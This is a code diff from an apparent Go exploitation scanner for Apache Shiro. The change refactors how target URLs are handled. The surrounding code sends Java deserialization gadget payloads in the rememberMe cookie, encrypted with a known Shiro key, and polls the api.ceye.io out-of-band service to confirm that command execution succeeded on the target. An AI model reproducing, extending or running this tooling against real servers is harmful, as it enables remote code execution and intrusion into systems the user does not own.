@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"github.com/go-basic/uuid"
 	"io/ioutil"
+	"net/url"
 	"os"
 	"strconv"
 	"time"
@@ -42,7 +43,7 @@ type queryResult struct {
 var AvailableGadget = make([]string, 0, 10)
 
 type GadgetScanner struct {
-	TargetUrl      string
+	TargetUrl      *url.URL
 	TargetShiroKey string
 }
 
@@ -57,15 +58,16 @@ func (this GadgetScanner) Scan() {
 		// Dynamic invoke the serialFunc
 		serialData := serialFunc(command)
 
-		shiroConnection := conn.NewConnection(this.TargetUrl)
+		shiroConnection := &conn.Connection{BaseUrl: this.TargetUrl}
 		fmt.Println("[+] Test Payload: " + funcName)
 		response := shiroConnection.SendRememberMe([]byte(this.TargetShiroKey), serialData)
 		fmt.Println("[-] Response Code: " + strconv.Itoa(response.StatusCode))
 
 		var queryTemplate = "http://api.ceye.io/v1/records?token=%s&type=http&filter=%s"
-		var queryAddress = fmt.Sprintf(queryTemplate, TOKEN, randomID)
+		var queryAddressRaw = fmt.Sprintf(queryTemplate, TOKEN, randomID)
+		queryAddress, _ := url.Parse(queryAddressRaw)
 		// query the record
-		queryConnection := conn.NewConnection(queryAddress)
+		queryConnection := &conn.Connection{BaseUrl: queryAddress}
 		time.Sleep(time.Second / 2)
 		recordResponse := queryConnection.QueryRecord()
 		body, _ := ioutil.ReadAll(recordResponse.Body)
